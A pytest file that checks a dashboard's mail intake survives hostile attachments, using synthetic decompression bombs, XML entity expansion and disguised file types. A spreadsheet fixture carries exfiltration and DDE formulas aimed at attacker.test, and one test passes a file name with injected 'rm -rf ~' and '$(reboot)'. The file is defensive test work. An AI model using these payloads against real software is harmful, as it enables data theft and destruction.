"""Hostile mail and attachments (PD-3.6, DEC-53): whatever arrives, it costs one document at most, never the app.

Every file here is made up in the test. The probes behind each limit are in BUILD_HISTORY (PD-3.6)."""

from __future__ import annotations

import contextlib
import io
import json
import os
import shutil
import socket
import subprocess
import sys
import threading
import time
import zipfile
import zlib
from pathlib import Path

import pytest
from sqlalchemy import select
from sqlalchemy.orm import Session

from po_dashboard.db.mail import SourceDocument, SourceMessage
from po_dashboard.intake import messages, worker
from po_dashboard.intake.reading import FAILED, NOT_READ, READ, read_pending, read_stored
from po_dashboard.intake.store import FileStore
from po_dashboard.intake.text import NotReadable, extract_text
from po_dashboard.intake.worker import ReaderFailed, read_isolated
from po_dashboard.mail import gmail_auth
from test_gate import env  # noqa: F401
from test_gmail import run_sign_in
from test_intake import db, put, store  # noqa: F401
from test_text import picture_of

needs_tesseract = pytest.mark.skipif(shutil.which("tesseract") is None, reason="Tesseract is not installed")
# On a Mac the sandbox must be there: if Apple ever removes sandbox-exec these fail rather than quietly skip (RISK-14).
needs_sandbox = pytest.mark.skipif(sys.platform != "darwin", reason="the macOS sandbox exists only on macOS")


# ---------------------------------------------------------------- builders (all synthetic)


def pdf(objects: list[bytes]) -> bytes:
    """A minimal PDF from numbered object bodies; object 1 is the catalogue."""
    out = io.BytesIO()
    out.write(b"%PDF-1.7\n")
    offsets = []
    for n, body in enumerate(objects, 1):
        offsets.append(out.tell())
        out.write(b"%d 0 obj\n" % n + body + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1))
    for offset in offsets:
        out.write(b"%010d 00000 n \n" % offset)
    out.write(b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref))
    return out.getvalue()


def stream(data: bytes, extra: bytes = b"", *, packed: bool = True) -> bytes:
    body = zlib.compress(data, 9) if packed else data
    flate = b"/Filter /FlateDecode " if packed else b""
    return b"<< /Length %d %s%s >>\nstream\n" % (len(body), flate, extra) + body + b"\nendstream"


def one_page(content: bytes, resources: bytes = b"") -> list[bytes]:
    return [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << %s >> >>" % resources,
        content,
    ]


def flate_bomb() -> bytes:
    """One page whose drawing instructions inflate from about 100 KB to 80 MB."""
    unit = b"BT /F1 12 Tf 72 720 Td (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj ET\n"
    return pdf(one_page(stream(unit * (80_000_000 // len(unit)))))


def image_pdf(side: int, image: bytes, filters: bytes) -> bytes:
    """A page with no text and one picture, so the reader treats it as a scan."""
    head = b"<< /Length %d /Type /XObject /Subtype /Image /Width %d /Height %d /ColorSpace /DeviceGray " \
           b"/BitsPerComponent 8 %s >>\nstream\n" % (len(image), side, side, filters)  # fmt: skip
    xobject = head + image + b"\nendstream"
    return pdf([*one_page(stream(b"q 612 0 0 792 0 0 cm /Im0 Do Q\n"), b"/XObject << /Im0 5 0 R >>"), xobject])


def looping_pages() -> bytes:
    return pdf([
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Pages /Parent 2 0 R /Kids [2 0 R 3 0 R] /Count 1 >>",
    ])  # fmt: skip


EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\nshowpage\n"


def png_claiming(width: int, height: int) -> bytes:
    """A real 1x1 PNG whose header claims to be width x height."""
    import struct

    out = io.BytesIO()
    __import__("PIL.Image", fromlist=["Image"]).new("L", (1, 1)).save(out, format="PNG")
    data = bytearray(out.getvalue())
    header = b"IHDR" + struct.pack(">II", width, height) + bytes(data[24:29])
    data[16:24] = struct.pack(">II", width, height)
    data[29:33] = struct.pack(">I", zlib.crc32(header))
    return bytes(data)


def gif_of(frames: int) -> bytes:
    from PIL import Image

    pictures = [Image.new("L", (1, 1), n % 256) for n in range(frames)]
    out = io.BytesIO()
    pictures[0].save(out, format="GIF", save_all=True, append_images=pictures[1:], duration=1)
    return out.getvalue()


def xlsx_with(cells: str, *, extra: dict[str, bytes] | None = None) -> bytes:
    """A workbook written by hand, so a cell can carry a formula and its saved value as Excel itself writes them."""
    main = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
    rel = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    parts = {
        "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
        'content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships'
        '+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override '
        'PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.'
        'spreadsheetml.worksheet+xml"/></Types>',
        "_rels/.rels": f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
        f'relationships"><Relationship Id="rId1" Type="{rel}/officeDocument" Target="xl/workbook.xml"/>'
        "</Relationships>",
        "xl/workbook.xml": f'<?xml version="1.0"?><workbook xmlns="{main}" xmlns:r="{rel}"><sheets><sheet '
        'name="Order" sheetId="1" r:id="rId1"/></sheets></workbook>',
        "xl/_rels/workbook.xml.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
        f'package/2006/relationships"><Relationship Id="rId1" Type="{rel}/worksheet" '
        'Target="worksheets/sheet1.xml"/></Relationships>',
        "xl/worksheets/sheet1.xml": f'<?xml version="1.0"?><worksheet xmlns="{main}"><sheetData>{cells}'
        "</sheetData></worksheet>",
    }
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, body in parts.items():
            archive.writestr(name, body)
        for name, data in (extra or {}).items():
            archive.writestr(name, data)
    return out.getvalue()


def laughs_docx() -> bytes:
    entities = ['<!ENTITY a0 "lollollollollollollollollollol">']
    entities += [f'<!ENTITY a{n} "' + f"&a{n - 1};" * 10 + '">' for n in range(1, 10)]
    document = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE w:document [' + "".join(entities)
                + ']><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p>'
                "<w:r><w:t>&a9;</w:t></w:r></w:p></w:body></w:document>")  # fmt: skip
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org'
                         '/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/>'
                         '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-'
                         'officedocument.wordprocessingml.document.main+xml"/></Types>')  # fmt: skip
        archive.writestr("_rels/.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
                         'package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
                         'officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
                         "</Relationships>")  # fmt: skip
        archive.writestr("word/document.xml", document)
    return out.getvalue()


def message(headers: bytes, body: bytes) -> bytes:
    return b"From: a@vendor.test\r\nTo: p@example-buyer.test\r\nDate: Mon, 02 Nov 2026 09:30:00 +0000\r\n" \
           b"MIME-Version: 1.0\r\n" + headers + b"\r\n" + body  # fmt: skip


def many_parts(count: int) -> bytes:
    parts = b"".join(b"--XX\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; "
                     b"filename=f%d.bin\r\n\r\n%d\r\n" % (n, n) for n in range(count))  # fmt: skip
    return message(b"Subject: parts\r\nContent-Type: multipart/mixed; boundary=XX\r\n", parts + b"--XX--\r\n")


def nested(depth: int) -> bytes:
    inner = b"Content-Type: text/plain\r\n\r\nhello\r\n"
    for n in range(depth):
        boundary = b"b%d" % n
        inner = b"Content-Type: multipart/mixed; boundary=%s\r\n\r\n--%s\r\n%s\r\n--%s--\r\n" % (
            boundary, boundary, inner, boundary)  # fmt: skip
    return b"From: a@vendor.test\r\nMIME-Version: 1.0\r\n" + inner


def encoded_words(count: int) -> bytes:
    return b" ".join(b"=?utf-8?q?a=%02X?=" % (n % 128) for n in range(count))


# ---------------------------------------------------------------- PDF bombs and broken PDFs


def test_a_pdf_compression_bomb_is_refused_without_a_blow_up() -> None:
    started = time.monotonic()
    with pytest.raises(NotReadable, match="unsafe size"):
        read_isolated("pdf", "bomb.pdf", flate_bomb())
    assert time.monotonic() - started < 60


def test_a_pdf_picture_bomb_is_refused() -> None:
    side = 12_000  # 144 million grey pixels from about 140 KB
    with pytest.raises(NotReadable, match="unsafe size|too large"):
        read_isolated("pdf", "scan.pdf", image_pdf(side, zlib.compress(bytes(side * side), 9), b"/Filter /FlateDecode"))


def test_a_pdf_whose_pages_loop_is_refused_at_once() -> None:
    started = time.monotonic()
    with pytest.raises(NotReadable, match="damaged"):
        read_isolated("pdf", "loop.pdf", looping_pages())
    assert time.monotonic() - started < 30


def test_a_program_named_like_a_pdf_is_refused() -> None:
    with pytest.raises(NotReadable, match="not what its name says"):
        extract_text("pdf", "invoice.pdf", b"MZ\x90\x00" + os.urandom(2000))


def test_a_jbig2_scan_never_starts_the_jbig2dec_program(tmp_path: Path) -> None:
    from pypdf import PdfReader, apply_configuration

    marker = tmp_path / "ran"
    program = tmp_path / "jbig2dec"
    program.write_text(f"#!/bin/sh\ntouch '{marker}'\nexit 1\n")
    program.chmod(0o700)
    scan = image_pdf(8, b"not really jbig2", b"/Filter /JBIG2Decode")
    with apply_configuration(jbig2dec_binary=str(program)):  # as if jbig2dec were installed
        with contextlib.suppress(Exception):
            [image.data for image in PdfReader(io.BytesIO(scan)).pages[0].images]  # noqa: B018
        assert marker.exists()  # the check below is meaningful: left alone, pypdf runs the program
        marker.unlink()
        with pytest.raises(NotReadable, match="picture format"):
            extract_text("pdf", "scan.pdf", scan)
    assert not marker.exists()


# ---------------------------------------------------------------- images


def test_an_eps_file_named_png_is_never_opened_as_eps(monkeypatch: pytest.MonkeyPatch) -> None:
    from PIL import EpsImagePlugin, Image

    opened: list[bool] = []
    real = EpsImagePlugin.EpsImageFile._open

    def spy(self: EpsImagePlugin.EpsImageFile) -> None:
        opened.append(True)
        real(self)

    monkeypatch.setattr(EpsImagePlugin.EpsImageFile, "_open", spy)
    Image.open(io.BytesIO(EPS)).close()
    assert opened  # Pillow on its own takes it for EPS, which would run Ghostscript if it were installed
    opened.clear()
    with pytest.raises(NotReadable, match="damaged"):
        extract_text("image", "a.png", EPS)
    assert not opened


def test_a_picture_claiming_billions_of_pixels_is_refused_before_it_is_decoded() -> None:
    with pytest.raises(NotReadable, match="too large"):
        read_isolated("image", "a.png", png_claiming(50_000, 50_000))


def test_a_gif_with_thousands_of_frames_is_read_ten_frames_at_most(monkeypatch: pytest.MonkeyPatch) -> None:
    from po_dashboard.intake import text

    monkeypatch.setattr(text, "_ocr", lambda png: "")
    started = time.monotonic()
    assert extract_text("image", "a.gif", gif_of(3000)).pages == 10
    assert time.monotonic() - started < 30


# ---------------------------------------------------------------- spreadsheets and Word


def test_a_formula_gives_its_saved_value_only_and_is_never_run_or_fetched() -> None:
    cells = (
        '<row r="1"><c r="A1" t="inlineStr"><is><t>Total</t></is></c>'
        '<c r="B1"><f>WEBSERVICE("http://attacker.test/steal")</f><v>42</v></c>'
        "<c r=\"C1\"><f>cmd|' /C calc'!A0</f><v>0</v></c>"
        '<c r="D1"><f>HYPERLINK("http://attacker.test","click")</f></c></row>'
    )
    got = extract_text("spreadsheet", "a.xlsx", xlsx_with(cells)).text
    assert "Total\t42\t0" in got
    assert "attacker" not in got and "WEBSERVICE" not in got and "cmd" not in got and "HYPERLINK" not in got


def test_a_macro_inside_a_file_named_xlsx_is_ignored_and_the_values_are_read() -> None:
    cells = '<row r="1"><c r="A1" t="inlineStr"><is><t>PO 4521</t></is></c></row>'
    macro = {"xl/vbaProject.bin": b"\xd0\xcf\x11\xe0 macro"}
    assert "PO 4521" in extract_text("spreadsheet", "a.xlsx", xlsx_with(cells, extra=macro)).text


def test_text_that_looks_like_a_formula_stays_text_and_the_export_neutralises_it() -> None:
    from po_dashboard.ledger.reports import safe_cell

    cells = '<row r="1"><c r="A1" t="inlineStr"><is><t>=HYPERLINK("http://attacker.test")</t></is></c></row>'
    got = extract_text("spreadsheet", "a.xlsx", xlsx_with(cells)).text
    assert '=HYPERLINK("http://attacker.test")' in got  # the model sees it as words; nothing runs it
    assert safe_cell('=HYPERLINK("http://attacker.test")').startswith("'")  # and a CSV export can never run it


def test_a_word_file_with_nested_entities_is_refused_at_once() -> None:
    started = time.monotonic()
    with pytest.raises((NotReadable, ReaderFailed)):
        read_isolated("word", "a.docx", laughs_docx())
    assert time.monotonic() - started < 30


# ---------------------------------------------------------------- the reading process


def test_a_reader_that_hangs_is_stopped_with_everything_it_started(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    pid_file = tmp_path / "pid"
    script = (f"import subprocess, pathlib; p = subprocess.Popen(['/bin/sleep', '60']); "
              f"pathlib.Path({str(pid_file)!r}).write_text(str(p.pid)); p.wait()")  # fmt: skip
    monkeypatch.setattr(worker, "command", lambda *_args: [sys.executable, "-c", script])
    started = time.monotonic()
    with pytest.raises(NotReadable, match="took too long"):
        read_isolated("text", "a.txt", b"x", seconds=2)
    assert time.monotonic() - started < 10
    pid = int(pid_file.read_text())
    for _ in range(50):  # the helper it started is stopped too
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            break
        time.sleep(0.1)
    else:
        pytest.fail("the program the reader started was left running")


def test_a_reader_that_uses_too_much_memory_stops_and_the_file_is_not_read() -> None:
    with pytest.raises(NotReadable, match="too much memory"):
        read_isolated("text", "a.txt", b"PO 4521", memory=1)


@pytest.mark.parametrize(
    ("script", "reason"),
    [
        ("import os, signal; os.kill(os.getpid(), signal.SIGSEGV)", "stopped unexpectedly"),
        ("print('hello')", "does not understand"),
        ("import sys; sys.stdout.write('x' * 3_000_000)", "stopped unexpectedly"),
        ('print(\'{"state": "read", "text": 5}\')', "does not understand"),
    ],
    ids=["crash", "nonsense", "flood", "wrong-shape"],
)
def test_a_reader_that_crashes_or_answers_wrongly_marks_the_file_failed(
    db: Session, store: FileStore, monkeypatch: pytest.MonkeyPatch, script: str, reason: str
) -> None:
    monkeypatch.setattr(worker, "command", lambda *_args: [sys.executable, "-c", script])
    put(db, store, message(b"Subject: x\r\n", b"PO 4521\r\n"))
    read_pending(db, store)
    body = db.scalars(select(SourceDocument)).one()
    assert body.state == FAILED and reason in (body.not_read_reason or "")


def test_a_deeply_nested_message_is_stored_whole_and_a_merely_deep_one_is_read(db: Session, store: FileStore) -> None:
    put(db, store, nested(5000))  # 5,000 levels broke the parser with a RecursionError before PD-3.6
    deepest = db.scalars(select(SourceDocument)).one()
    assert deepest.state == NOT_READ and deepest.not_read_reason == messages.TOO_MANY_PARTS
    put(db, store, nested(900))  # just under the cap on parts: read without trouble
    assert read_pending(db, store)[READ] == 1


@needs_sandbox
def test_the_reader_cannot_use_the_network_write_files_start_programs_or_read_the_originals(tmp_path: Path) -> None:
    hidden = tmp_path / "originals"
    hidden.mkdir()
    (hidden / "other-vendor.pdf").write_text("ANOTHER VENDOR'S PRICES")
    (tmp_path / "visible.txt").write_text("fine")
    listener = socket.create_server(("127.0.0.1", 0))
    port = listener.getsockname()[1]
    script = f"""
import json, socket, subprocess
def attempt(action):
    try:
        action(); return "allowed"
    except PermissionError: return "denied"
    except OSError as problem: return type(problem).__name__
def connect(): socket.create_connection(("127.0.0.1", {port}), timeout=3).close()
def write(): open({str(tmp_path / "written.txt")!r}, "w").write("x")
def run(): subprocess.run(["/bin/echo", "hi"], capture_output=True, check=True)
def peek(): open({str(hidden / "other-vendor.pdf")!r}).read()
def look(): open({str(tmp_path / "visible.txt")!r}).read()
print(json.dumps({{"network": attempt(connect), "write": attempt(write), "program": attempt(run),
                   "originals": attempt(peek), "other files": attempt(look)}}))
"""
    tesseract = shutil.which("tesseract", path=worker.PATH)
    rules = worker.profile([sys.executable, *([tesseract] if tesseract else [])], [hidden])
    done = subprocess.run([worker.SANDBOX, "-p", rules, sys.executable, "-I", "-c", script],  # noqa: S603
                          capture_output=True, text=True, timeout=60, check=True)  # fmt: skip
    listener.close()
    assert json.loads(done.stdout) == {
        "network": "denied", "write": "denied", "program": "denied", "originals": "denied", "other files": "allowed",
    }  # fmt: skip
    assert not (tmp_path / "written.txt").exists()


FRAMEWORK_PYTHONS = sorted(Path("/Library/Frameworks/Python.framework/Versions").glob("3.*/bin/python3.*[0-9]"))


@needs_sandbox
@pytest.mark.skipif(not FRAMEWORK_PYTHONS, reason="no python.org (framework) Python on this Mac")
def test_a_python_that_restarts_itself_still_runs_in_the_sandbox() -> None:
    """DEF-011: python.org's Python restarts itself through Python.app; a profile naming only the python file refused
    that, so every document failed on GitHub's Macs. Run here whenever such a Python is installed."""
    python = str(FRAMEWORK_PYTHONS[-1])
    home = subprocess.run([python, "-I", "-c", "import sys; print(sys.base_prefix)"],  # noqa: S603
                          capture_output=True, text=True, check=True).stdout.strip()  # fmt: skip
    for rules, works in ((worker.profile([python], []), False), (worker.profile([python], [], home), True)):
        done = subprocess.run([worker.SANDBOX, "-p", rules, python, "-I", "-c", "print('ran')"],  # noqa: S603
                              capture_output=True, text=True, timeout=60)  # fmt: skip
        assert (done.stdout.strip() == "ran") is works, (works, done.stderr[-200:])
    blocked = subprocess.run(
        [worker.SANDBOX, "-p", worker.profile([python], [], home), python, "-I", "-c",
         "import subprocess; subprocess.run(['/bin/echo', 'x'], check=True)"],
        capture_output=True, text=True, timeout=60,
    )  # noqa: S603  # fmt: skip
    assert blocked.returncode != 0  # programs outside the Python installation are still refused


@needs_sandbox
def test_the_app_reads_every_document_inside_the_sandbox_with_the_originals_hidden(tmp_path: Path) -> None:
    store = FileStore(tmp_path / "originals")
    built = worker.command("pdf", "pdf", worker.MEMORY_BYTES, [store.root])
    assert built[0] == worker.SANDBOX
    assert str(store.root.resolve()) in built[2] and str(worker.KEYCHAINS) in built[2]
    assert f'(subpath "{os.path.realpath(sys.base_prefix)}")' in built[2]  # DEF-011
    assert "(deny network*)" in built[2] and "(deny file-write*)" in built[2]
    _, path = store.put(b"PO 4521 shipped")
    assert read_stored(store, "text", "a.txt", path).state == READ


@needs_sandbox
@needs_tesseract
def test_tesseract_still_works_inside_the_sandbox(tmp_path: Path) -> None:
    assert "4521" in read_isolated("image", "a.png", picture_of("PO 4521"), hidden=[tmp_path]).text


def test_without_the_sandbox_the_reader_still_runs_apart_and_says_so_once(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    monkeypatch.setattr(worker, "SANDBOX", str(tmp_path / "no-sandbox-exec"))
    monkeypatch.setattr(worker, "_warned", threading.Event())
    assert "PO 4521" in read_isolated("text", "a.txt", b"PO 4521").text
    assert "PO 4521" in read_isolated("text", "b.txt", b"PO 4521").text
    assert len([r for r in caplog.records if r.name == worker.__name__]) == 1


def test_a_hostile_file_name_or_kind_never_reaches_the_reading_process_command(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[tuple[str, ...]] = []
    real = worker.command
    monkeypatch.setattr(worker, "command", lambda *args: seen.append(args[:2]) or real(*args))
    read_isolated("text", "a.txt; rm -rf ~ .$(reboot)", b"x")
    assert seen == [("text", "-")]
    with pytest.raises(NotReadable):
        read_isolated("--help", "a.txt", b"x")


# ---------------------------------------------------------------- hostile messages (inside the app)


def test_a_header_with_thousands_of_encoded_words_cannot_exhaust_memory(db: Session, store: FileStore) -> None:
    """The structured email parser took over 2 GB for this 0.3 MB Subject. Checked in a separate process with a
    500 MB cap, so a regression fails the test instead of the Mac."""
    script = (
        "from po_dashboard.intake import messages, worker; worker._watch_memory(500 * 1024 * 1024)\n"
        "words = b' '.join(b'=?utf-8?q?a=%02X?=' % (n % 128) for n in range(20_000))\n"
        "raw = b'From: a@vendor.test\\r\\nSubject: ' + words + b'\\r\\n\\r\\nx\\r\\n'\n"
        "print(len(messages.header(messages.parse(raw), 'Subject') or ''))\n"
    )
    done = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=120)  # noqa: S603
    assert done.returncode == 0, "the header used more than 500 MB" if done.returncode == worker.MEMORY_EXIT else ""
    assert 0 < int(done.stdout) <= 1000
    put(db, store, message(b"Subject: " + encoded_words(20_000) + b"\r\n", b"x\r\n"))  # and the whole intake path
    assert 0 < len(db.scalars(select(SourceMessage)).one().subject or "") <= 1000


def test_a_message_with_thousands_of_parts_is_stored_whole_and_not_taken_apart(db: Session, store: FileStore) -> None:
    started = time.monotonic()
    outcome = put(db, store, many_parts(2500))
    assert time.monotonic() - started < 30
    assert outcome.documents == 1 and outcome.not_read == 1
    body = db.scalars(select(SourceDocument)).one()
    assert body.state == NOT_READ and body.not_read_reason == messages.TOO_MANY_PARTS
    assert db.scalars(select(SourceMessage)).one().subject == "parts"


def test_a_normal_message_with_attachments_is_still_taken_apart(db: Session, store: FileStore) -> None:
    assert put(db, store, many_parts(30)).documents == 31


def test_raw_and_encoded_names_are_kept_as_readable_text(db: Session, store: FileStore) -> None:
    body = (b"--XX\r\nContent-Type: text/plain\r\n\r\nhi\r\n"
            b"--XX\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; "
            b'filename="=?UTF-8?B?QXVmdHJhZ3NiZXN0w6R0aWd1bmcucGRm?="\r\n\r\nA\r\n'
            b"--XX\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; "
            b"filename*=UTF-8''Rechnung%20%C3%84.pdf\r\n\r\nB\r\n"
            b"--XX\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; "
            b'filename="M\xfcller.pdf"\r\n\r\nC\r\n--XX--\r\n')  # fmt: skip
    headers = ("Subject: =?utf-8?q?Best=C3=A4tigung?= für PO 4521\r\n".encode()
               + "From: José Müller <j@vendor.test>\r\n".encode()
               + b"Content-Type: multipart/mixed; boundary=XX\r\n")  # fmt: skip
    put(db, store, message(headers, body).replace(b"From: a@vendor.test\r\n", b"", 1))
    row = db.scalars(select(SourceMessage)).one()
    assert row.subject == "Bestätigung für PO 4521" and row.sender == "José Müller <j@vendor.test>"
    names = {d.filename for d in db.scalars(select(SourceDocument))}
    assert {"Auftragsbestätigung.pdf", "Rechnung Ä.pdf", "Müller.pdf"} <= names  # the last was raw Latin-1


# ---------------------------------------------------------------- the Gmail sign-in listener


def test_a_silent_connection_cannot_hold_up_the_sign_in(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(gmail_auth._Receiver, "timeout", 0.5)
    silent: list[socket.socket] = []

    def callback(uri: str, state: str) -> str:
        port = int(uri.split(":")[2].split("/")[0])
        silent.append(socket.create_connection(("127.0.0.1", port)))  # connects first and never says a word
        return f"{uri}?code=ONE-TIME&state={state}"

    (tokens, _), _, _ = run_sign_in(callback, wait=8)
    assert tokens["access_token"]
    silent[0].close()
